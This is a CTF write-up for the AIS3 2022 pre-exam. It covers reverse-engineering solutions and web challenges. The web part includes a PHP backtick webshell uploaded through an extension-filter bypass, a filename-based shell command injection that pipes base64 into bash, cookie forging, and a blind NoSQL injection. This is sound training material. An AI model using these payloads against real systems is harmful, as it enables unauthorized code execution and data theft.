# AIS3-2022-Pre-exam-Writeup

- Team: `Ice1187`
- Ranking: 2nd

<img width="800" alt="ais3-pre-exam-scoreboard" src="https://user-images.githubusercontent.com/38059464/175545378-5b5f373e-7da8-4c96-b7d7-463e5a16caf5.png" >

## Reverse
### Time Management

1. 每次 print flag 的一個字元要等 30000 多秒。
<img width="600" alt="time-management-sleep" src="https://user-images.githubusercontent.com/38059464/176660727-2e290e6f-0d5c-44c4-b296-f1fd0978461a.png">

2. 從 `objdump` 找到要 patch 的 instruction 在 `0x122b`。
<img width="600" alt="time-management-instruct" src="https://user-images.githubusercontent.com/38059464/176661153-ef3dc1bc-751e-480f-89d2-edeef8959421.png">

3. 用 vim 打開 `chal`，然後輸入指令 `:%!xxd` 將 binary 轉成 `xxd` 的 hexdump 格式。
<img width="527" alt="time-management-convert" src="https://user-images.githubusercontent.com/38059464/176663520-977eb575-f806-43b7-9df4-b87a9487ee95.png">

4. 找到 `0x122b` 的位置即為要 patch 的部分 `0x00008763`。
<img width="600" alt="time-management-before-patch" src="https://user-images.githubusercontent.com/38059464/176662170-71bd84e7-b3c9-475e-9d6d-20109f4dfbd1.png">

5. 將其修改成 1 秒，同時也把右半部的 ASCII 改成 `.`。
<img width="600" alt="time-management-after-patch" src="https://user-images.githubusercontent.com/38059464/176662667-939556fb-5fde-4703-a23c-8d10037923b2.png">

6. 輸入指令 `:%!xxd -r` 將 hexdump revert 回 binary。
<img width="600" alt="time-management-revert" src="https://user-images.githubusercontent.com/38059464/176663015-142c69ca-0ad9-4692-815a-d126cb9e6af2.png">

7. 執行 patch 後的 binary 即可得到 flag，但因為最後會輸出 `\r`，因此要邊輸出邊按換行避免輸出被蓋掉。
<img width="600" alt="time-management-flag" src="https://user-images.githubusercontent.com/38059464/176664787-295a4753-cfaa-4479-b3ce-7bd92ddad48c.png">

**Flag: `AIS3{You_are_the_master_of_time_management!!!!!}`**

### Calculator

To be written...

### 殼

1. 如果有看過，應該會知道這是[文言](https://github.com/wenyan-lang/wenyan)，一種文言文程式語言。
<img width="947" alt="wenyan-code" src="https://user-images.githubusercontent.com/38059464/176665877-d7ad91d9-6466-4fd4-b117-c9424b3b1ca2.png">

2. 可以透過以下指令執行 `殼.wy` 和將其轉成 JavaScript。
```bash
$ npm install @wenyan/core
$ npm install js-beautify

$ ./node_modules/.bin/wenyan --dir ./chal/藏書樓/ ./chal/殼.wy   # execute
輸入「助」以獲得更多幫助
>

$ cd ./chal
$ npx --package=@wenyan/cli wenyan -c -o ../decomp.js -r --roman pinyin 殼.wy   # convert to JavaScript
$ node_modules/.bin/js-beautify ./decomp.js > decomp_beauty.js                  # beautify JavaScript
```

3. 簡單看一下 JavaScript code 可以發現輸入要以 `蛵煿 ` 開頭，然後輸入經過一些運算之後要符合 `密旗` (`MI4QI2`) 這個變數的內容。
<img width="592" alt="wenyan-decomp" src="https://user-images.githubusercontent.com/38059464/176666873-ab912dba-1218-44e0-b0bb-d01f41b87c56.png">

4. 後來實在是懶得看，觀察輸入之後發現每 3 個輸入字元決定 2 個輸出字元，因此把 mapping 建出來，就能直接從答案反推輸入了。所有組合大概有 1000000 組，最後花了 6~8 個小時建出大概 8 成的 mapping，然後反推輸入得到 flag。
<img width="1372" alt="wenyan-guess" src="https://user-images.githubusercontent.com/38059464/176668657-68797378-5fea-4173-a99a-fb3aa1289847.png">

**Flag: `AIS3{chaNcH4n_a1_Ch1k1ch1k1_84n8An_M1nNa_5upa5utA_n0_TAMa90_5a}`**

### Flag Checker

1. Bianry 需要 `GLIBC_2.33`, `GLIBC_2.34`，可以用 docker 建一個臨時的 Ubuntu 22.04 來用。
<img width="1086" alt="flag-cheker-glibc" src="https://user-images.githubusercontent.com/38059464/176669338-09ce8646-a074-47d4-a61e-fc3f1caaedc9.png">


2. 跑 Ubuntu 22.04 docker container。
```bash
$ cat Dockerfile
FROM ubuntu:22.04
RUN apt-get update && apt-get upgrade -y

COPY ./flag_checker /

$ sudo docker build -t flag-checker-demo .
$ sudo docker run -itd flag-checker-demo:latest
eccce3f0aa7eaf6dcd8548afc5a57ff5a289fbc4ff99611b4dbeadeafc41d1a8
$ sudo docker exec -it eccc /bin/bash
root@eccce3f0aa7e:/# ./flag_checker
a
Bad
```

3. 從 IDA 得知輸入開頭須為 `AIS3{`。
<img width="533" alt="flag-checker-ais3-start" src="https://user-images.githubusercontent.com/38059464/176687851-9211a505-7b70-4ca4-a28c-1308ab8e265f.png">

4. 使用 `gdb` 追進去，發現其透過 `execve` 執行 `python`。
```gdb
pwndbg> r
Starting program: /flag_checker
warning: Error disabling address space randomization: Operation not permitted
[Thread debugging using libthread_db enabled]
Using host libthread_db library "/lib/x86_64-linux-gnu/libthread_db.so.1".
^C
Program received signal SIGINT, Interrupt.
pwndbg> ni
AIS3{AAAAAAAA}
pwndbg> catch syscall
Catchpoint 1 (any syscall)
pwndbg> c
Continuing.

Catchpoint 1 (call to syscall execve), 0x00005582a84281d0 in ?? ()
pwndbg> ni
────────────────────────[ STACK ]────────────────────────
00:0000│ rsp 0x7fff7b088140 ◂— 0x4
01:0008│     0x7fff7b088148 —▸ 0x7fff7b0884dc ◂— 0x336e6f68747970 /* 'python3' */
02:0010│     0x7fff7b088150 —▸ 0x7fff7b0884e4 ◂— 0x706d695f5f00632d /* '-c' */
03:0018│     0x7fff7b088158 —▸ 0x7fff7b0884e7 ◂— 0x74726f706d695f5f ('__import')
04:0020│     0x7fff7b088160 —▸ 0x7fff7b0888fd ◂— 'AAAAAAAA}'
05:0028│     0x7fff7b088168 ◂— 0x0
06:0030│     0x7fff7b088170 —▸ 0x7fff7b088907 ◂— 'LESSOPEN=| /usr/bin/lesspipe %s'
07:0038│     0x7fff7b088178 —▸ 0x7fff7b088927 ◂— 'HOSTNAME=73648dfc4d1a'
```
<img width="800" alt="flag-checker-see-python" src="https://user-images.githubusercontent.com/38059464/176689285-713021ea-b4e7-4ad7-b158-4c8d279bf6f8.png">

5. 用 `dump` 把執行的 command 拉出來。
<img width="800" alt="flag-checker-dump-python" src="https://user-images.githubusercontent.com/38059464/176690786-295fef4c-9da4-41e7-ae60-846c1fa5d3a7.png">
<img width="800" alt="flag-checker-python-cmd" src="https://user-images.githubusercontent.com/38059464/176691230-ed335cfd-771c-4ba4-b317-9d5447cf3919.png">

6. 用 [`picktools`](https://docs.python.org/3/library/pickletools.html) disassemble pickle code。
<img width="800" alt="flag-checker-disasm" src="https://user-images.githubusercontent.com/38059464/176692533-fa7bf77f-2e7f-44b5-81e8-1e8b2c805c3c.png">

7. 讀一下 disassemble 的 pickle，可以還原其 check 大致如下：
<img width="1384" alt="flag-checker-rsa-like-check" src="https://user-images.githubusercontent.com/38059464/176693484-340d42d5-702c-4c87-b4a4-3b180087e0ff.png">

8. 觀察上述 check 可發現，此算法與 RSA 十分相似：`a` 是明文，`b` 是密文，`65537` 是 `e`，一長串模數是 `N`，只差在 [`N` 本身即是質數](http://factordb.com/index.php?query=542732316977950510497270190501021791757395568139126739977487019184541033966691938940926649138411381198426866278991473)，而不是兩個質數的積。但這並不影響 RSA decrypt 的運算，因此可以用以下方法還原輸入，得到 flag。
```python
from Crypto.Util.number import inverse

# RSA-like solution
n = 542732316977950510497270190501021791757395568139126739977487019184541033966691938940926649138411381198426866278991473
r = n-1    # n is a prime, so r = phi(n) = n-1
e = 65537
d = inverse(e, r)
c = 451736263303355935449028567064392382249020023967373174925770068593206982683303653948838172763093279548888815048027759
m = pow(c, d, n)
flag = m.to_bytes(64, 'big').strip(b'\x00').decode()
flag = 'AIS3{' + flag

print(flag)
```

**Flag: `AIS3{from_rop_to_python_to_pickle_to_math}`**




## Web
### Poking Bear

1. 網頁上顯示的 bear 的 URL 為 `/bear/<n>`，因此猜測要找的 bear 應該也是同樣的格式。

2. 產生 `0` ~ `1000` 的 wordlist `bear.txt`，然後用 `ffuf` 進行爆搜，並將沒有 bear 的結果過濾掉。找到唯一不在網頁上的 bear `499` 即為 secret bear。
```bash
$ ffuf -u http://chals1.ais3.org:8987/bear/FUZZ -w ./bear.txt | grep -v 'Size: 1358 ./fuzz_bear.txt
5                       [Status: 200, Size: 1742, Words: 295, Lines: 42]
29                      [Status: 200, Size: 1743, Words: 295, Lines: 42]
82                      [Status: 200, Size: 1743, Words: 295, Lines: 42]
327                     [Status: 200, Size: 1744, Words: 295, Lines: 42]
350                     [Status: 200, Size: 1740, Words: 295, Lines: 42]
499                     [Status: 200, Size: 1847, Words: 335, Lines: 46]
777                     [Status: 200, Size: 1744, Words: 295, Lines: 42]
999                     [Status: 200, Size: 1744, Words: 295, Lines: 42]
```

3. 需要成為 `bear poker`，因此將 Cookie 的 `human` 設成 `bear poker`，再 poke 一次就拿到 flag。
```bash
$ curl http://chals1.ais3.org:8987/bear/499
Hello human, you need to be a "bear poker" to poke the SECRET BEAR.
$ curl http://chals1.ais3.org:8987/poke -H 'Cookie: human=bear poker' -d 'bear _id=499' -H 'Content-Type: application/x-www-form-urlencoded'
<script>alert(`AIS3{y0u_P0l<3_7h3_Bear_H@rdLy><}`); location='/'</script>
```

**Flag: `AIS3{y0u_P0l<3_7h3_Bear_H@rdLy><}`**

### Simple File Uploader

1. 不能上傳 `php`, `php2`, `php3`, `php4`, `php5`, `php6`, `phar`, `phtm`，可以用 `pHP` bypass 檢查。
2. Ban 掉一堆危險 function，可以用 `` ` `` 執行 shell command 讀取 flag。

```php
<?php
echo(`/rUn_M3_t0_9et_fL4g`);
?>
```

**Flag: 忘了留...**

### Tari Tari
1. 上傳 `trash.txt` 後，網頁提供的下載網址為 `http://chals1.ais3.org:9453/download.php?file=MjY1MDEwZmI2MDg2NGU1MGFjZTg5Y2RkYjE4ZmQxZjIudGFyLmd6&name=trash.txt.tar.gz`。把 `file` base64 decode 得到 `265010fb60864e50ace89cddb18fd1f2.tar.gz`，由此猜測 `file` 可以讀取任意檔案。

2. 讀取 `index.php`，發現其使用 `passthru` 執行 shell command，而 `$filename` 為使用者可控，因此可以 RCE。
```php
$filename = $file['name'];
$path = bin2hex(random_bytes(16)) . ".tar.gz";
$source = substr($file['tmp_name'], 1);
$destination = "./files/$path";
passthru("tar czf '$destination' --transform='s|$source|$filename|' --directory='/tmp' '/$source'", $return);
```

3. 上傳檔案即可讀到 flag。
```bash
$ echo abc >  "'|| echo $(echo -n cat /y000000_i_am_the_f14GGG.txt | base64) | base64 -d | bash;#"
$ ls
total 32K
-rw-r--r-- 1 ice1187 ice1187    0 May 15 18:16 ''\''|| echo Y2F0IC95MDAwMDAwX2lfYW1fdGhlX2YxNEdHRy50eHQ= | base64 -d | bash;#'
```

**Flag: `AIS3{test_flag (to be changed)}`**  (這個 flag 有夠迷惑...)

### The Best Login UI

1. `bodyParser.urlencoded` 中設定 `extended = true`，表示 [HTTP 傳入的參數會被當作 object](https://www.npmjs.com/package/body-parser#extended)，而非 string。再加上使用 MongoDB，因此可以嘗試 NoSQL injection。
<img width="556" alt="the-best-login-ui-extended" src="https://user-images.githubusercontent.com/38059464/176656006-0c26cfd0-bfbc-4bda-8651-2e4b81e21344.png">

2. 確認可以做 NoSQL injection ([MongoDB query syntax](https://www.mongodb.com/docs/manual/reference/operator/query/))。
<img width="654" alt="the-best-login-ui-nosql-injection" src="https://user-images.githubusercontent.com/38059464/176657306-5a465ed2-8004-480b-8546-3b3c0a6f68eb.png">

3. 使用 [`$regex`](https://www.mongodb.com/docs/manual/reference/operator/query/regex/#mongodb-query-op.-regex) 把 flag 爆出來，當時寫的 script 超醜就不貼了...。

**Flag: `AIS3{Bl1nd-b4s3d r3gex n0sq1i?! (:3[___]}`**

## Pwn


## Crypto


## Misc
